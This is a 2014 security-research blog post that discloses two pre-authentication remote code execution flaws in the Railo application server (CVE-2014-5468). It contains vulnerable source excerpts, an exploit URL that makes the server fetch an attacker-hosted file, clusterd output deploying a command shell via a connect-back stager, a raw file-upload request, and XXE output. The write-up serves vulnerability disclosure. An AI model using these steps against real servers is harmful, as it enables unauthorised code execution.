---
categories:
- railo
- clusterd
comments: false
date: "2014-08-27T15:00:00Z"
title: railo security - part four - pre-auth remote code execution
---

*[Part one - intro](http://hatriot.github.io/blog/2014/06/25/railo-security-part-one/)*  
*[Part two - post-auth rce](http://hatriot.github.io/blog/2014/07/24/railo-security-part-two/)*  
*[Part three - pre-auth password retrieval](http://hatriot.github.io/blog/2014/08/23/railo-security-part-three)*  
*Part four - pre-auth remote code execution*

This post concludes our deep dive into the Railo application server by detailing not only one, but two pre-auth remote code execution vulnerabilities.  If you've skipped the first three parts of this blog post to get to the juicy stuff, I don't blame you, but I do recommend going back and reading them; there's some important information and details back there.  In this post, we'll be documenting both vulnerabilities from start to finish, along with some demonstrations and notes on clusterd's implementation on one of these.

The first RCE vulnerability affects versions 4.1 and 4.2.x of Railo, 4.2.1 being the latest release.  Our vulnerability begins with the file `thumbnail.cfm`, which Railo uses to store admin thumbnails as static content on the server.  As previously noted, Railo relies on authentication measures via the cfadmin tag, and thus none of the cfm files actually contain authentication routines themselves.

`thumbnail.cfm` first generates a hash of the image along with it's width and height:

```
<cfset url.img=trim(url.img)>
<cfset id=hash(url.img&"-"&url.width&"-"&url.height)>
<cfset mimetypes={png:'png',gif:'gif',jpg:'jpeg'}>
```

Once it's got a hash, it checks if the file exists, and if not, attempts to read and write it down:

```
<cffile action="readbinary" file="#url.img#" variable="data">
<cfimage action="read" source="#data#" name="img">

<!--- shrink images if needed --->
<cfif img.height GT url.height or img.width GT url.width>
    <cfif img.height GT url.height >
        <cfimage action="resize" source="#img#" height="#url.height#" name="img">
    </cfif>
    <cfif img.width GT url.width>
        <cfimage action="resize" source="#img#" width="#url.width#" name="img">
    </cfif>
    <cfset data=toBinary(img)>
</cfif>
```

The `cffile` tag is used to read the raw image and then cast it via the `cfimage` tag.  The wonderful thing about `cffile` is that we can provide URLs that it will arbitrarily retrieve.  So, our URL can be this:

```
192.168.1.219:8888/railo-context/admin/thumbnail.cfm?img=http://192.168.1.97:8000/my_image.png&width=5000&height=50000
```

And Railo will go and fetch the image and cast it.  Note that if a height and width are not provided it will attempt to resize it; we don't want this, and thus we provide large width and height values.  This file is written out to `/railo/temp/admin-ext-thumbnails/[HASH].[EXTENSION]`.

We've now successfully written a file onto the remote system, and need a way to retrieve it.  The temp folder is not accessible from the web root, so we need some sort of LFI to fetch it.  Enter `jsloader.cfc`.  

`jsloader.cfc` is a Railo component used to fetch and load Javascript files.  In this file is a CF tag called `get`, which accepts a single argument `lib`, which the tag will read and return.  We can use this to fetch arbitrary Javascript files on the system and load them onto the page.  Note that it MUST be a Javascript file, as the extension is hard-coded into the file and null bytes don't work here, like they would in PHP.  Here's the relevant code:

```
<cfset var filePath = expandPath('js/#arguments.lib#.js')/>
    <cfset var local = {result=""} /><cfcontent type="text/javascript">
        <cfsavecontent variable="local.result">
            <cfif fileExists(filePath)>
                <cfinclude template="js/#arguments.lib#.js"/>
            </cfif>
        </cfsavecontent>
    <cfreturn local.result />
```

Let's tie all this together.  Using `thumbnail.cfm`, we can write well-formed images to the file system, and using the `jsloader.cfc` file, we can read arbitrary Javascript.  Recall how log injection works with PHP; we can inject PHP tags into arbitrary files so long as the file is loaded by PHP, and parsed accordingly.  We can fill a file full of junk, but if the parser has its way a single `<?phpinfo();?>` will be discovered and executed; the CFML engine works the same way. 

Our attack becomes much more clear: we generate a well-formed PNG file, embed CFML code into the image (metadata), set the extension to `.js`, and write it via `thumbnail.cfm`.  We then retrieve the file via `jsloader.cfc` and, because we're loading it with a CFM file, it will be parsed and executed.  Let's check this out:

```
$ ./clusterd.py -i 192.168.1.219 -a railo -v4.1 --deploy ./src/lib/resources/cmd.cfml --deployer jsload

        clusterd/0.3.1 - clustered attack toolkit
            [Supporting 6 platforms]

 [2014-06-15 03:39PM] Started at 2014-06-15 03:39PM
 [2014-06-15 03:39PM] Servers' OS hinted at windows
 [2014-06-15 03:39PM] Fingerprinting host '192.168.1.219'
 [2014-06-15 03:39PM] Server hinted at 'railo'
 [2014-06-15 03:39PM] Checking railo version 4.1 Railo Server...
 [2014-06-15 03:39PM] Checking railo version 4.1 Railo Server Administrator...
 [2014-06-15 03:39PM] Checking railo version 4.1 Railo Web Administrator...
 [2014-06-15 03:39PM] Matched 2 fingerprints for service railo
 [2014-06-15 03:39PM]   Railo Server Administrator (version 4.1)
 [2014-06-15 03:39PM]   Railo Web Administrator (version 4.1)
 [2014-06-15 03:39PM] Fingerprinting completed.
 [2014-06-15 03:39PM] This deployer (jsload_lfi) requires an external listening port (8000).  Continue? [Y/n] > 
 [2014-06-15 03:39PM] Preparing to deploy cmd.cfml...
 [2014-06-15 03:40PM] Waiting for remote server to download file [5s]]
 [2014-06-15 03:40PM] Invoking stager and deploying payload...
 [2014-06-15 03:40PM] Waiting for remote server to download file [7s]]
 [2014-06-15 03:40PM] cmd.cfml deployed at /railo-context/cmd.cfml
 [2014-06-15 03:40PM] Finished at 2014-06-15 03:40PM
```

A couple things to note; as you may notice, the module currently requires the Railo server to connect back twice.  Once is for the image with embedded CFML, and the second for the payload.  We embed only a stager in the image that then connects back for the actual payload.

Sadly, the LFI was unknowingly killed in 4.2.1 with the following fix to `jsloader.cfc`:

```
<cfif arguments.lib CT "..">
    <cfheader statuscode="400">
    <cfreturn "// 400 - Bad Request">
</cfif>
```

The `arguments.lib` variable contains our controllable path, but it kills our ability to traverse out.  Unfortunately, we can't substitute the .. with unicode or utf-16 due to the way Jetty and Java are configured, by default.  This file is pretty much useless to us now, unless we can write into the folder that `jsloader.cfc` reads from; then we don't need to traverse out at all.

We can still pop this on Express installs, due to the Jetty LFI discussed in part 3.  By simply traversing into the extensions folder, we can load up the Javascript file and execute our shell.  Railo installs still prove elusive. 

buuuuuuuuuuuuuuuuuuuuuuuuut

Recall the `img.cfm` LFI from part 3; by tip-toeing back into the admin-ext-thumbnails folder, we can summon our vulnerable image and execute whatever coldfusion we shove into it.  This proves to be an even better choice than `jsloader.cfc`, as we don't need to traverse as far.  This bug only affects versions 4.1 - 4.2.1, as `thumbnail.cfm` wasn't added until 4.1.  `CVE-2014-5468` has been assigned to this issue.

The second RCE vulnerability is a bit easier and has a larger attack vector, spanning all versions of Railo.  As previously noted, Railo does not do per page/URL authentication, but rather enforces it when making changes via the `<cfadmin>` tag.  Due to this, any pages doing naughty things without checking with the tag may be exploitable, as previously seen.  Another such file is `overview.uploadNewLangFile.cfm`:

```
<cfif structKeyExists(form, "newLangFile")>
    <cftry>
        <cffile action="UPLOAD" filefield="form.newLangFile" destination="#expandPath('resources/language/')#" nameconflict="ERROR">
        <cfcatch>
            <cfthrow message="#stText.overview.langAlreadyExists#">
        </cfcatch>
    </cftry>
    <cfset sFile = expandPath("resources/language/" & cffile.serverfile)>
    <cffile action="READ" file="#sFile#" variable="sContent">
    <cftry>
        <cfset sXML     = XMLParse(sContent)>
        <cfset sLang    = sXML.language.XMLAttributes.label>
        <cfset stInLang = GetFromXMLNode(sXML.XMLRoot.XMLChildren)>
        <cfcatch>
            <cfthrow message="#stText.overview.ErrorWhileReadingLangFile#">
        </cfcatch>
    </cftry>
```

I mean, this might as well be an upload form to write arbitrary files.  It's stupid simple to get arbitrary data written to the system:

```
POST /railo-context/admin/overview.uploadNewLangFile.cfm HTTP/1.1
Host: localhost:8888
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:18.0) Gecko/20100101 Firefox/18.0 Iceweasel/18.0.1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://localhost:8888/railo-context/admin/server.cfm
Connection: keep-alive
Content-Type: multipart/form-data; boundary=AaB03x
Content-Length: 140

--AaB03x
Content-Disposition: form-data; name="newLangFile"; filename="xxxxxxxxx.lang"
Content-Type: text/plain

thisisatest
--AaB03x--
```

The tricky bit is where it's written to; Railo uses a compression system that dynamically generates compressed versions of the web server, contained within `railo-context.ra`.  A mirror of these can be found under the following:

```
[ROOT]\webapps\ROOT\WEB-INF\railo\temp\compress
```

The compressed data is then obfuscated behind two more folders, both MD5s.  In my example, it becomes:

```
[ROOT]\webapps\ROOT\WEB-INF\railo\temp\compress\88d817d1b3c2c6d65e50308ef88e579c\0bdbf4d66d61a71378f032ce338258f2
```

So we cannot simply traverse into this path, as the hashes change every single time a file is added, removed, or modified.  I'll walk the logic used to generate these, but as a precusor, we aren't going to figure these out without some other fashionable info disclosure bug.

The hashes are calculated in `railo-java/railo-core/src/railo/commons/io/res/type/compress/Compress.java`:

```
temp=temp.getRealResource("compress");                
temp=temp.getRealResource(MD5.getDigestAsString(cid+"-"+ffile.getAbsolutePath()));
if(!temp.exists())temp.createDirectory(true);
}
catch(Throwable t){}
}

    if(temp!=null) {
        String name=Caster.toString(actLastMod)+":"+Caster.toString(ffile.length());
        name=MD5.getDigestAsString(name,name);
        root=temp.getRealResource(name);
        if(actLastMod>0 && root.exists()) return;
```

The first hash is then `cid + "-" + ffile.getAbsolutePath()`, where `cid` is the randomly generated ID found in the `id` file (see part two) and `ffile.getAbsolutePath()` is the full path to the classes resource.  This is doable if we have the XXE, but 4.1+ is inaccessible.

The second hash is `actLastMode + ":" + ffile.length()`, where `actLastMode` is the last modified time of the file and `ffile.length()` is the obvious file length.  Again, this is likely not brute forcable without a serious infoleak vulnerability.  Hosts <= 4.0 are exploitable, as we can list files with the XXE via the following:

```
bryan@debdev:~/tools/clusterd$ python http_test_xxe.py 
88d817d1b3c2c6d65e50308ef88e579c

[SNIP - in which we modify the path to include ^]

bryan@debdev:~/tools/clusterd$ python http_test_xxe.py
0bdbf4d66d61a71378f032ce338258f2

[SNIP - in which we modify the path to include ^]

bryan@debdev:~/tools/clusterd$ python http_test_xxe.py
admin
admin_cfc$cf.class
admin_cfm$cf.class
application_cfc$cf.class
application_cfm$cf.class
component_cfc$cf.class
component_dump_cfm450$cf.class
doc
doc_cfm$cf.class
form_cfm$cf.class
gateway
graph_cfm$cf.class
jquery_blockui_js_cfm1012$cf.class
jquery_js_cfm322$cf.class
META-INF
railo_applet_cfm270$cf.class
res
templates
wddx_cfm$cf.class
```

`http_test_xxe.py` is just a small hack I wrote to exploit the XXE, in which we eventually obtain both valid hashes.  So we can exploit this in versions <= 4.0 Express.  Later versions, as far as I can find, have no discernible way of obtaining full RCE without another infoleak or resorting to a slow, loud, painful death of brute forcing two MD5 hashes.

The first RCE is currently available in clusterd dev, and a PR is being made to Metasploit thanks to @BrandonPrry.  Hopefully it can be merged shortly.

As we conclude our Railo analysis, lets quickly recap the vulnerabilities discovered during this audit:

```
Version 4.2:
    - Pre-authentication LFI via `img.cfm` (Install/Express)
    - Pre-authentication LFI via Jetty CVE (Express)
    - Pre-authentication RCE via `img.cfm` and `thumbnail.cfm` (Install/Express)
    - Pre-authentication RCE via `jsloader.cfc` and `thumbnail.cfm` (Install/Express) (Up to version 4.2.0)
Version 4.1:
    - Pre-authentication LFI via `img.cfm` (Install/Express)
    - Pre-authentication LFI via Jetty CVE (Express)
    - Pre-authentication RCE via `img.cfm` and `thumbnail.cfm` (Install/Express)
    - Pre-authentication RCE via `jsloader.cfc` and `thumbnail.cfm` (Install/Express)
Version 4.0:
    - Pre-authentication LFI via XXE (Install/Express)
    - Pre-authentication LFI via Jetty CVE (Express)
    - Pre-authentication LFI via `img.cfm` (Install/Express)
    - Pre-authentication RCE via XXE and `overview.uploadNewLangFile` (Install/Express)
    - Pre-authentication RCE via `jsloader.cfc` and `thumbnail.cfm` (Install/Express)
    - Pre-authentication RCE via `img.cfm` and `thumbnail.cfm` (Install/Express)
Version 3.x:
    - Pre-authentication LFI via `img.cfm` (Install/Express)
    - Pre-authentication LFI via Jetty CVE (Express)
    - Pre-authentication LFI via XXE (Install/Express)
    - Pre-authentication RCE via XXE and `overview.uploadNewLangFile` (Express)
```

This does not include the random XSS bugs or post-authentication issues.  At the end of it all, this appears to be a framework with great ideas, but *desperately* in need of code TLC.  Driving forward with a checklist of features may look nice on a README page, but the desolate wasteland of code left behind can be a scary thing.  Hopefully the Railo guys take note and spend some serious time evaluating and improving existing code.  The bugs found during this series have been disclosed to the developers; here's to hoping they follow through.

{{< figure src="/images/posts/2014/railo/railo-getrailo-error.jpg" >}}
